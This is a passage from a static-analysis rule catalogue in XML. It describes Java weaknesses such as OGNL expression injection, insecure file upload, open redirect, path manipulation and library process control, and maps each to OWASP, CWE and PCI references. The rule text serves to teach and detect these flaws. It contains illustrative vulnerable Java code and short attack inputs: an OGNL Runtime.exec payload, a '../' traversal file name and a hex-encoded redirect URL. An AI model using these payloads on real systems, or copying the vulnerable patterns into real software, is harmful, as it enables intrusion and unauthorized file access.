																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1, Requirement 6.5.6</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[19]  <em>Xerces parser features</em> The Apache Foundation<br></p>
																									   <p>[20]  <em>XML Validation in J2SE 1.5</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_missing_xml_validation_untyped_response
		</key>
		<internalKey>Input Validation and Representation/Missing XML
			Validation/Untyped Response
		</internalKey>
		<name>Missing XML Validation: Untyped Response</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Failure to enable validation when parsing XML gives an attacker the opportunity to supply malicious input.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input. It is not possible for an XML parser to validate all aspects of a document's content; a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10]  <em>Axis User's Guide</em> Apache Software Foundation<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 112</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1, Requirement 6.5.6</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[19]  <em>Xerces parser features</em> The Apache Foundation<br></p>
																									   <p>[20]  <em>XML Validation in J2SE 1.5</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_ognl_expression_injection
		</key>
		<internalKey>Input Validation and Representation/OGNL Expression
			Injection
		</internalKey>
		<name>OGNL Expression Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The evaluation of unvalidated OGNL expressions can lead to remote code execution.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Object-Graph Navigation Language (OGNL), is an open-source Expression Language (EL) for Java that allows the evaluation of EL expression and their execution in a context provided by the developers. Allowing unvalidated expressions to be evaluated against any context will allow an attacker to execute arbitrary code.<br><br>In the following example, the application is using unvalidated data controlled by the user to create an evaluate an OGNL expression:<br><pre><br>OgnlContext ctx = new OgnlContext();<br>String expression = request.getParameter("input");<br>Object expr = Ognl.parseExpression(expression);<br>Object value = Ognl.getValue(expr, ctx, root);<br>System.out.println("Value: " + value);<br></pre><br><br>An attacker can submit the following expression to execute arbitrary code in the application server context:<br><code><br>  (#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc.exe"))<br></code><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5]  <em>Apache Commons OGNL - Object Graph Navigation Library</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 95</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[14] Meder Kydyraliev <em>Milking a horse or executing remote code in modern Java frameworks</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_ognl_expression_injection_struts_2
		</key>
		<internalKey>Input Validation and Representation/OGNL Expression
			Injection/Struts 2
		</internalKey>
		<name>OGNL Expression Injection: Struts 2</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The Url built using the Struts 2 <code>&lt;s:url /&gt;</code> or <code>&lt;s:a /&gt;</code> tags evaluates the query parameters as OGNL expressions allowing an attacker to modify system variables like Session or execute arbitrary commands on the server.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Object-Graph Navigation Language (OGNL) is an open-source Expression Language (EL) for Java that allows the evaluation of EL expression in the Struts 2 Value Stack context. Allowing unvalidated expressions to be evaluated against the Value Stack will allow an attacker to access and modify system variables or execute arbitrary code.<br><br>Setting the <code>includeParams</code> parameter to <code>all</code> or <code>get</code> makes Struts 2 to evaluate all the request parameters as OGNL expressions and include the evaluated expressions as parameters for the Url or Anchor built using <code>&lt;s:url /&gt;</code> or <code>&lt;s:a /&gt;</code> tags. An attacker can submit any arbitrary OGNL payload in the request query that will be evaluated by Struts 2 when rendering the URL.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5]  <em>Apache Commons OGNL - Object Graph Navigation Library</em> <br></p>
																									   <p>[6] Apache Struts 2 <em>Apache Struts 2 Security Bulletin S2-013</em> <br></p>
																									   <p>[7] Apache Struts 2 <em>Apache Struts 2 Security Bulletin S2-014</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 95</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[16] Meder Kydyraliev <em>Milking a horse or executing remote code in modern Java frameworks</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[21] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_often_misused_file_upload
		</key>
		<internalKey>Input Validation and Representation/Often Misused/File
			Upload
		</internalKey>
		<name>Often Misused: File Upload</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Regardless of the language a program is written in, the most devastating attacks often involve remote code execution, whereby an attacker succeeds in executing malicious code in the program's context. If attackers are allowed to upload files to a directory that is accessible from the Web and cause these files to be passed to a code interpreter (e.g. JSP/ASPX/PHP), then they can cause malicious code contained in these files to execute on the server.<br><br><b>Example:</b> The following Struts 2 action class implements a setter than can be used to handle uploaded files.<br><pre><br>public class Struts2Upload extends ActionSupport<br>{<br>    ...<br>    private File uploadFile;<br>    public void setUploadFile(File file)<br>    {<br>        uploadFile = file;<br>    }<br>    ...<br>}<br></pre><br><br>Even if a program stores uploaded files under a directory that isn't accessible from the Web, attackers might still be able to leverage the ability to introduce malicious content into the server environment to mount other attacks. If the program is susceptible to path manipulation, command injection, or dangerous file inclusion vulnerabilities, then an attacker might upload a file with malicious content and cause the program to read or execute it by exploiting another vulnerability.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A3 Malicious File Execution</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 434</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 434</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 434</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.3</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>
																									   <p>[19] Alla Bezroutchko <em>Secure file upload in PHP web applications</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_open_redirect</key>
		<internalKey>Input Validation and Representation/Open Redirect
		</internalKey>
		<name>Open Redirect</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing unvalidated input to control the URL used in a redirect can aid phishing attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Redirects allow web applications to direct users to different pages within the same application or to external sites. Applications utilize redirects to aid in site navigation and, in some cases, to track how users exit the site. Open redirect vulnerabilities occur when a web application redirects clients to any arbitrary URL that can be controlled by an attacker.<br><br>Attackers can utilize open redirects to trick users into visiting a URL to a trusted site and redirecting them to a malicious site. By encoding the URL, an attacker can make it more difficult for end-users to notice the malicious destination of the redirect, even when it is passed as a URL parameter to the trusted site. Open redirects are often abused as part of phishing scams to harvest sensitive end-user data.<br><br><br><br><br><b>Example 1:</b> The following JSP code instructs the user's browser to open a URL parsed from the <code>dest</code> request parameter when a user clicks the link.<br><br><pre><br>    &lt;%<br>        ...<br>        String strDest = request.getParameter("dest");<br>        pageContext.forward(strDest);<br>        ...<br>    %&gt;<br></pre><br><br>If a victim received an email instructing the user to follow a link to &quot;http://trusted.example.com/ecommerce/redirect.asp?dest=www.wilyhacker.com&quot;, the user would likely click on the link believing they would be transferred to the trusted site. However, when the user clicks the link, the code above will redirect the browser to &quot;http://www.wilyhacker.com&quot;.<br><br>Many users have been educated to always inspect URLs they receive in emails to make sure the link specifies a trusted site they know. However, if the attacker Hex encoded the destination url as follows:<br> &quot;http://trusted.example.com/ecommerce/redirect.asp?dest=%77%69%6C%79%68%61%63%6B%65%72%2E%63%6F%6D&quot;<br><br>then even a savvy end-user may be fooled into following the link.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A10 Unvalidated Redirects and Forwards</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A10 Unvalidated Redirects and Forwards</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Content Spoofing</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 601</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 601</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 601</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_path_manipulation</key>
		<internalKey>Input Validation and Representation/Path Manipulation
		</internalKey>
		<name>Path Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing user input to control paths used in filesystem operations could enable an attacker to access or modify otherwise protected system resources.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Path manipulation errors occur when the following two conditions are met:<br><br>1. An attacker can specify a path used in an operation on the filesystem.<br><br>2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.<br><br>For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.<br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example 1:</b> The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "<code>../../tomcat/conf/server.xml</code>", which causes the application to delete one of its own configuration files.<br><br><pre><br>String rName = request.getParameter("reportName");<br>File rFile = new File("/usr/local/apfr/reports/" + rName);<br>...<br>rFile.delete();<br></pre><br><br><b>Example 2:</b> The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension <code>.txt</code>.<br><br><pre><br>fis = new FileInputStream(cfg.getProperty("sub")+".txt");<br>amt = fis.read(arr);<br>out.println(arr);<br></pre><br><br>Some think that in the mobile world, classic vulnerabilities, such as path manipulation, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 3:</b> The following code adapts Example 1 to the Android platform.<br><br><pre><br>...<br>        String rName = this.getIntent().getExtras().getString("reportName");<br>        File rFile = getBaseContext().getFileStreamPath(rName);<br>...<br>        rFile.delete();<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 22, CWE ID 73</em> <br></p>
																									   <p>[11] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Path Traversal</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 022</em> <br></p>
																									   <p>[19] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Risky Resource Management - CWE ID 022</em> <br></p>
																									   <p>[20] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 426</em> <br></p>
																									   <p>[21] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_process_control</key>
		<internalKey>Input Validation and Representation/Process Control
		</internalKey>
		<name>Process Control</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Loading libraries without specifying an absolute path can cause the program to load malicious libraries supplied by an attacker. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Process control vulnerabilities take two forms:<br><br>- An attacker can change the name of the library that the program loads: the attacker explicitly controls what the name of the library is.<br><br>- An attacker can change the environment in which the library is loaded: the attacker implicitly controls what the library name means.<br><br>In this case we are primarily concerned with the second scenario, the possibility that an attacker may be able to control the environment in such a way that the program loads a malicious version of the named library.<br><br>1. An attacker provides a malicious library to an application.<br><br>2. The application loads the malicious library because it fails to specify an absolute path or verify the file being loaded.<br><br>3. By executing code from the library, the application gives the attacker a privilege or capability that the attacker would not otherwise have.<br><br><b>Example:</b> The following code uses <code>System.loadLibrary()</code> to load code from a native library named <code>library.dll</code>, which is normally found in a standard system directory.<br><br><pre><br>...<br>System.loadLibrary("library.dll");<br>...<br></pre><br><br>The problem here is that <code>System.loadLibrary()</code> accepts a library name, not a path, for the library to be loaded. From the Java 1.4.2 API documentation this function behaves as follows [1]:<br><br>A file containing native code is loaded from the local file system from a place where library files are conventionally obtained. The details of this process are implementation-dependent. The mapping from a library name to a specific filename is done in a system-specific manner.<br><br>If an attacker is able to place a malicious copy of <code>library.dll</code> higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's <code>library.dll</code> will now be run with elevated privileges, possibly giving the attacker complete control of the system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 114</em> <br></p>
																									   <p>[11]  <em>Java 1.4.2 API Documentation</em> Sun Microsystems<br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_process_control_invoker_servlet
		</key>
		<internalKey>Input Validation and Representation/Process
			Control/Invoker Servlet
		</internalKey>
		<name>Process Control: Invoker Servlet</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The <code>InvokerServlet</code> class can allow attackers to invoke any class on the server.
							</p>
							<h2>EXPLANATION</h2>
							<p>
